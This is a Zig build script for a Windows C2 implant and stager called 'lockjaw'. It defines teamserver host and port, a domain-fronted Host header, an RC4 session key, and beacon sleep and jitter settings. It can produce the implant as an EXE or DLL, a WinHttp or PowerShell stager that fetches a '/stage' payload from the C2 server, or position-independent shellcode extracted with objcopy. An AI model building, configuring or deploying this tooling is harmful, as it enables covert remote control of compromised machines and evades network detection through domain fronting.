const std = @import("std");

pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{
        .default_target = .{
            .cpu_arch = .x86_64,
            .os_tag = .windows,
        },
    });

    const optimize = b.standardOptimizeOption(.{});

    // C2 connectivity options
    const c2_host      = b.option([]const u8, "c2_host",      "Teamserver HTTPS IP/Host")         orelse "127.0.0.1";
    const c2_port      = b.option(u16,        "c2_port",      "Teamserver HTTPS Port")             orelse 8080;
    const c2_domain    = b.option([]const u8, "c2_domain",    "Domain Fronted Host Header")        orelse "";
    const c2_key       = b.option([]const u8, "c2_key",       "RC4 session key (32-char hex)")     orelse "deadbeefdeadbeefdeadbeefdeadbeef";
    const c2_transport = b.option([]const u8, "c2_transport", "Transport (http|https|dns)")          orelse "http";
    const c2_sleep     = b.option(u32,        "c2_sleep",     "Beacon sleep interval (seconds)")  orelse 5;
    const c2_jitter    = b.option(u32,        "c2_jitter",    "Jitter percentage (0-100)")         orelse 20;

    // Build flags
    const is_stager    = b.option(bool, "is_stager",    "Build the stager instead of implant") orelse false;
    const is_dll       = b.option(bool, "is_dll",       "Build a DLL instead of an EXE")       orelse false;
    const is_shellcode = b.option(bool, "is_shellcode", "Build PIC shellcode (stager)")        orelse false;
    const use_ps_stager = b.option(bool, "use_ps_stager", "Use PowerShell-based stager instead of WinHttp") orelse false;

    const build_options = b.addOptions();
    build_options.addOption([]const u8, "c2_host",      c2_host);
    build_options.addOption(u16,        "c2_port",      c2_port);
    build_options.addOption([]const u8, "c2_domain",    c2_domain);
    build_options.addOption([]const u8, "c2_key",       c2_key);
    build_options.addOption([]const u8, "c2_transport", c2_transport);
    build_options.addOption(u32,        "c2_sleep",     c2_sleep);
    build_options.addOption(u32,        "c2_jitter",    c2_jitter);

    if (is_shellcode) {
        // Concatenate config and stager into one file to avoid COFF link limitations
        // Generate wide UTF-16LE host string for WinHttpConnect (LPCWSTR required).
        // Build a comma-separated list of .short values for each ASCII char + null terminator.
        // e.g. "127.0.0.1" → "49,50,55,46,48,46,48,46,49,0"
        var wide_buf: [512]u8 = undefined;
        var wide_pos: usize = 0;
        for (c2_host) |ch| {
            const piece = std.fmt.bufPrint(wide_buf[wide_pos..], "{d},", .{@as(u16, ch)}) catch break;
            wide_pos += piece.len;
        }
        // null terminator
        if (wide_pos < wide_buf.len - 1) {
            wide_buf[wide_pos] = '0';
            wide_pos += 1;
        }
        const wide_host_str = wide_buf[0..wide_pos];

        const config_s_content = b.fmt(
            \\.section .text$A, "ax"
            \\c2_host_val: .string "{s}"
            \\c2_host_val_w: .short {s}
            \\c2_port_val: .short {d}
            \\c2_flags_val: .long {d}
            \\
        , .{ c2_host, wide_host_str, c2_port, if (std.mem.eql(u8, c2_transport, "https")) @as(u32, 0x00800000) else @as(u32, 0) });

        const stager_src = if (use_ps_stager) "src/ps_stager.s" else "src/pic_stager.s";
        var main_s_content = std.fs.cwd().readFileAlloc(b.allocator, stager_src, 1024 * 1024) catch "";
        
        if (use_ps_stager) {
            // Patch the HOST:PORT in ps_stager.s string
            const protocol = if (std.mem.eql(u8, c2_transport, "https")) "https" else "http";
            const old_str = "http://HOST:PORT/stage";
            const new_url = b.fmt("{s}://{s}:{d}/stage", .{ protocol, c2_host, c2_port });
            main_s_content = std.mem.replaceOwned(u8, b.allocator, main_s_content, old_str, new_url) catch main_s_content;
        }

        const final_s_content = b.fmt("{s}\n{s}", .{ main_s_content, config_s_content });

        std.fs.cwd().writeFile(.{ .sub_path = "src/pic_stager_final.s", .data = final_s_content }) catch |err| {
            std.debug.print("Failed to write final.s: {any}\n", .{err});
        };

        const artifact = b.addObject(.{
            .name = "lockjaw_stager_pic",
            .root_module = b.createModule(.{
                .target = target,
                .optimize = optimize,
            }),
        });
        artifact.addAssemblyFile(b.path("src/pic_stager_final.s"));
        
        const bin_dir = b.getInstallPath(.bin, "");
        const bin_path = b.fmt("{s}/lockjaw_stager.bin", .{bin_dir});
        const obj_path = artifact.getEmittedBin();
        
        const concat_cmd = b.addSystemCommand(&.{ "sh", "-c", "mkdir -p $(dirname \"$2\") && objcopy -O binary -j \".text\\$A\" \"$1\" \"$2\"", "--" });
        concat_cmd.addFileArg(obj_path);
        concat_cmd.addArg(bin_path);
        
        b.getInstallStep().dependOn(&concat_cmd.step);
    } else {
        const source_file = if (is_stager) b.path("src/stager.zig") else b.path("src/main.zig");
        const name = if (is_stager) "lockjaw_stager" else "lockjaw_implant";

        const artifact = if (is_dll) b.addLibrary(.{
            .name = name,
            .root_module = b.createModule(.{
                .root_source_file = source_file,
                .target = target,
                .optimize = optimize,
                .strip = true,
                .single_threaded = true,
            }),
            .linkage = .dynamic,
        }) else b.addExecutable(.{
            .name = name,
            .root_module = b.createModule(.{
                .root_source_file = source_file,
                .target = target,
                .optimize = optimize,
                .strip = true,
                .single_threaded = true,
            }),
        });

        if (!is_dll) {
            artifact.subsystem = .Windows;
        }

        artifact.root_module.addOptions("build_options", build_options);
        b.installArtifact(artifact);
    }
}
